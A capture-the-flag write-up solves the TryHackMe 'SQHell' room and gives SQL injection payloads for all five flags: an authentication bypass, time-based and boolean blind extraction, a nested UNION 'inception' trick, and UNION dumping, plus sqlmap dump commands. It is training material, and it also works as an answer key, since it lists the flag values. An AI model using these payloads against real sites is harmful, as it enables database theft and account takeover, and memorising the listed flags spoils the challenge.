# SQHell - TryHackMe CTF Report

**Room**: [SQHell](https://tryhackme.com/room/sqhell)
**Target**: SQL Injection challenges with 5 flags, each requiring a different injection technique.

---

## Flags Summary

| Flag | Value | Technique | Endpoint |
|------|-------|-----------|----------|
| FLAG1 | `THM{FLAG1:E786483E5A53075750F1FA792E823BD2}` | Authentication Bypass (SQLi WHERE clause) | `/login` POST |
| FLAG2 | `THM{FLAG2:C678ABFE1C01FCA19E0X901CEDAB1D15}` | Time-based Blind via HTTP Header | X-Forwarded-For → sqhell_1 |
| FLAG3 | `THM{FLAG3:97AEB3B28A4864416718F3A5FAF8F308}` | Boolean-based Blind | `/register/user-check` GET |
| FLAG4 | `THM{FLAG4:BDF317B14EEF80A3F90729BF2B426BEF}` | SQL Inception (Nested UNION) | `/user?id=` GET |
| FLAG5 | `THM{FLAG5:B9C690D3B914F7038BA1FC65B3FDF3C8}` | UNION-based | `/post?id=` GET |

---

## FLAG1 — Login Bypass

**Database**: sqhell_2

Simple `' OR '1'='1` injection in the username field bypasses authentication and displays FLAG1.

```sql
admin' OR '1'='1
```

![FLAG1 displayed on login success page]

**Injection point**: `POST /login` — `username` parameter.

---

## FLAG2 — Time-based Blind via X-Forwarded-For

**Database**: sqhell_1

The Terms & Conditions page reveals "We log your IP address for analytics purposes." The application reads the `X-Forwarded-For` HTTP header and inserts it into a `hits` table. This INSERT is vulnerable to stacked-query injection.

**Test payload** (causes 3s delay):
```
X-Forwarded-For: 1.2.3.4'; SELECT SLEEP(3);#
```

**Extraction payload**:
```
X-Forwarded-For: 1' AND (SELECT sleep(0.5) FROM flag where SUBSTR(flag,N,1) = 'C') and '1'='1
```

**Automated extraction** with sqlmap:
```bash
sqlmap --dbms mysql --headers="X-Forwarded-For: 1*" \
  -u "http://TARGET/" --technique=T --hex -D sqhell_1 --dump
```

---

## FLAG3 — Boolean-based Blind

**Database**: sqhell_3

The `/register/user-check?username=` endpoint checks username availability via JSON. Returns `{"available":false}` when a condition is TRUE, `{"available":true}` when FALSE.

**Test**:
```
/register/user-check?username=admin' AND 1=1-- -   → {"available":false}
/register/user-check?username=admin' AND 1=2-- -   → {"available":true}
```

**Extraction**:
```
/register/user-check?username=admin' AND (SUBSTR((SELECT flag FROM flag LIMIT 0,1),N,1)) = 'C';-- -
```

**Automated extraction with sqlmap**:
```bash
sqlmap -u "http://TARGET/register/user-check?username=admin" \
  -p username --technique=B --hex -D sqhell_3 --dump
```

---

## FLAG4 — SQL Inception (Nested UNION Injection)

**Database**: sqhell_4 (user query) → sqhell_5 (posts query)

The `/user?id=` endpoint makes **two queries**:
1. `SELECT id, username, ? FROM users WHERE id = INPUT` → returns user data
2. `SELECT ... FROM posts WHERE user_id = [column1_value]` → uses column 1's result as user_id

This is "SQL Inception" — the result of the first query feeds into a second, also-injectable query.

The first query returns no rows for id=2, but we add a UNION row where column 1 contains a SQL injection payload for the **second** query:

```
http://TARGET/user?id=2 UNION SELECT "1 UNION SELECT null,flag,null,null FROM flag",null,null FROM information_schema.tables WHERE table_schema=database();-- -
```

This makes the second query become:
```sql
SELECT id, name, content FROM posts WHERE user_id = 1 UNION SELECT null,flag,null,null FROM flag
```

The flag appears as a post entry in the "Posts" section.

---

## FLAG5 — UNION-based Injection

**Database**: sqhell_5

The `/post?id=` endpoint has 4 columns (determined via `ORDER BY`).

**Extraction**:
```
http://TARGET/post?id=-1 UNION SELECT 1,flag,3,4 FROM flag
```

SQLi errors are displayed, confirming injection. Simple UNION extraction.

---

## Endpoints Summary

| Endpoint | Method | Parameter | Technique Used |
|----------|--------|-----------|----------------|
| `/login` | POST | `username` | Auth bypass |
| `/register/user-check` | GET | `username` | Boolean blind |
| `/user` | GET | `id` | SQL Inception (nested UNION) |
| `/post` | GET | `id` | UNION + Error-based |
| Any page | Header | `X-Forwarded-For` | Time-based blind |

## Databases

| Database | Tables | Accessible From |
|----------|--------|-----------------|
| sqhell_1 | `flag`, `hits` | X-Forwarded-For header |
| sqhell_2 | `users` | `/login` |
| sqhell_3 | `flag`, `users` | `/register/user-check` |
| sqhell_4 | `users` | `/user` (first query) |
| sqhell_5 | `flag`, `posts`, `users` | `/post`, `/user` (second query) |

All databases have a `users` table with `admin:password` credentials.
